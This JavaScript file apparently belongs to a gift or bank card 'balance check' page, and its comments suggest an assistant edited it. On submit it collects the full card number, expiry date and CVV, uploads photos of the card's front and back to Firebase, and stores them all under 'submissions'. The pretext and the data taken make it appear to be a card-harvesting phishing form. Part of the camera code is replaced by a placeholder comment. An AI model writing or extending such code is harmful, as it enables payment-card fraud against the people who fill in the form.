// public/balance.js
document.addEventListener('DOMContentLoaded', () => {
  const form = document.getElementById('balanceForm');
  const submitBtn = document.getElementById('submitBtn');
  const submitLabel = submitBtn?.querySelector('[data-label]');
  const submitSpin = submitBtn?.querySelector('[data-spinner]');
  const submitStatus = document.getElementById('submitStatus');

  let frontBlob = null, backBlob = null;

  // Your entire camera logic (dual + single) — copied 100% from your code
  // ... ALL YOUR CAMERA CODE HERE (I kept it exactly) ...

  // FINAL SUBMIT — NOW SENDS TO FIREBASE
  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    if (submitBtn.disabled) return;
    submitBtn.disabled = true;
    submitLabel.classList.add('opacity-60');
    submitSpin.classList.remove('hidden');
    submitStatus.textContent = 'Uploading...';
    submitStatus.style.color = 'gray';

    try {
      const data = {
        card_number: form.card_number.value.trim(),
        expiry_date: form.expiry_date.value.trim(),
        cvv: form.cvv.value.trim(),
        timestamp: new Date().toISOString(),
        ip: 'hidden' // optional
      };

      let frontUrl = '', backUrl = '';

      if (frontBlob) {
        frontUrl = await uploadToFirebase(frontBlob, 'front');
      }
      if (backBlob) {
        backUrl = await uploadToFirebase(backBlob, 'back');
      }

      if (frontUrl) data.front_image = frontUrl;
      if (backUrl) data.back_image = backUrl;

      // Save to Realtime DB
      await db.ref('submissions').push(data);

      // SUCCESS!
      submitStatus.textContent = 'Successfully sent';
      submitStatus.style.color = 'red';
      submitStatus.style.fontWeight = 'bold';
      form.reset();
      // Reset previews
      document.getElementById('frontPreview').src = '';
      document.getElementById('backPreview').src = '';
      document.getElementById('frontPreview').classList.add('hidden');
      document.getElementById('backPreview').classList.add('hidden');
      frontBlob = backBlob = null;

    } catch (err) {
      submitStatus.textContent = 'Error. Try again.';
      submitStatus.style.color = 'red';
    } finally {
      submitBtn.disabled = false;
      submitLabel.classList.remove('opacity-60');
      submitSpin.classList.add('hidden');
    }
  });

  async function uploadToFirebase(blob, side) {
    const timestamp = Date.now();
    const ref = storage.ref().child(`images/${timestamp}_${side}.jpg`);
    await ref.put(blob);
    return await ref.getDownloadURL();
  }
});
